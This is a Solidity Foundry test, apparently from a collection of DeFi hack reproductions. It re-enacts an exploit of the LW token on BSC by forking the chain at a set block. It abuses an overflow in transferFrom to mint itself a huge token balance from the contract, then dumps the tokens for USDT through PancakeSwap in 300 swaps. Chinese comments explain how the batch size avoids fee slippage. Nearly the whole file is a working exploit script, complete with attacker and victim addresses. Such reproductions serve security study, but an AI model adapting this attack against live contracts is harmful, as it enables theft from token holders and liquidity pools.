// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IERC20.sol";
import "./interface/IPancakePair.sol";
import "./interface/IPancakeRouter02.sol";

// Vulunable contract: https://bscscan.com/address/0xabc6e5a63689b8542dbdc4b4f39a7e00d4ac30c8#code
// TX : https://bscscan.com/tx/0x96a955304fed48a8fbfb1396ec7658e7dc42b7c140298b80ce4206df34f40e8d

// Total Lost: $7,251
// Chain: BSC
// Attacker: 0x56b2D55457B31FB4b78ebDDd6718ea2667804A06
// Attack Contract: 0xfe7E9C76affDBa7b7442adACa9C7c059ec3092FC
// Attack Tx: https://bscscan.com/tx/0x96a955304fed48a8fbfb1396ec7658e7dc42b7c140298b80ce4206df34f40e8d
// Vulnerable Contract: https://bscscan.com/address/0xabc6e5a63689b8542dbdc4b4f39a7e00d4ac30c8#code

contract LW_exp is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 LW = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair LW_USDT =
        IPancakePair(0x35886C6D74ACed4Ed0fbe0b851806278384D9A76);
    IPancakeRouter02 router =
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        cheats.createSelectFork("bsc", 40287544);
    }

    function testExp() public {
        emit log_named_decimal_uint(
            "[Begin] Attacker USDT before exploit",
            USDT.balanceOf(address(this)),
            18
        );

        multicall();

        emit log_named_decimal_uint(
            "[End] Attacker USDT after exploit",
            USDT.balanceOf(address(this)),
            18
        );
    }

    function multicall() internal {
        // 利用溢出漏洞，使合约地址给攻击合约转任意数量的代币
        LW.transferFrom(
            address(LW),
            address(this),
            1000000000000000000000000000000000
        );

        // 将代币卖出
        // 注意：这里代币在卖出时，会先触发合约中 “收取卖出手续费和营销手续费，并将手续费兑换成USDT 转给营销地址” 的逻辑，
        // 所以如果一次性兑换太多，收取的手续费过多导致兑换时造成很大的滑点，最后导致攻击者真正兑换时滑点过大兑换的U很少
        // 因此，我们这里一次兑换80_000_000个代币，这个数值可以根据实际情况调整，连续兑换300次，测试可以获利 8450 U
        address[] memory path = new address[](2);
        path[0] = address(LW);
        path[1] = address(USDT);
        USDT.approve(address(router), type(uint).max);
        LW.approve(address(router), type(uint).max);

        emit log_named_decimal_uint(
            "[-----] Pair USDT before exploit",
            USDT.balanceOf(address(LW_USDT)),
            18
        );
        for (uint i = 0; i < 300; i++) {
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                80_000_000 * 1e18,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
        emit log_named_decimal_uint(
            "[-----] Pair USDT before exploit",
            USDT.balanceOf(address(LW_USDT)),
            18
        );
    }
}
